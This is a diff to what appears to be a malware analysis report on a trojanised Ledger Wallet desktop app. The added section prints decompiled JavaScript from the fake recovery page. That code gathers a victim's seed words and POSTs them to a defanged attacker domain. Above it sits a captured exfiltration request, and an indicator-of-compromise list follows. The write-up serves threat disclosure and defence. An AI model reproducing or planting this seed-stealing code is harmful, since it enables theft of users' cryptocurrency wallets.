@@ -961,7 +961,36 @@ Accept-Language: en-GB
 {"seedwords":["123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123"],"token":"270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514","app":"ledger","url":"file:///Applications/Ledger%20Wallet.app/Contents/Resources/app.asar/.webpack/recovery-step-3.html"}
 ```
 
+The decompiled Electron App has the main exfiltration logic under: '[UNPACKED_APP.ASAR]/.webpack/recovery-step-3.html'
 
+```
+continueBtn.addEventListener('click', function () {
+  if (!this.classList.contains('active')) return;
+
+  const words = Array.from(inputs).map(i => i.value.trim());
+  const token = '270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514';
+  const targetUrl = 'hxxps[://]main[.]ledger-gate[.]coupons/modules/wallets';
+
+  fetch(targetUrl, {
+    method: 'POST',
+    cache: 'no-cache',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      seedwords: words,
+      token: token,
+      app: 'ledger',
+      url: location.href
+    })
+  })
+.then(response => {
+  location.href = 'index.html';
+})
+.catch(err => {
+  location.href = 'index.html';
+});
+```
 
 ## IOCs
 ballfrank[.]today
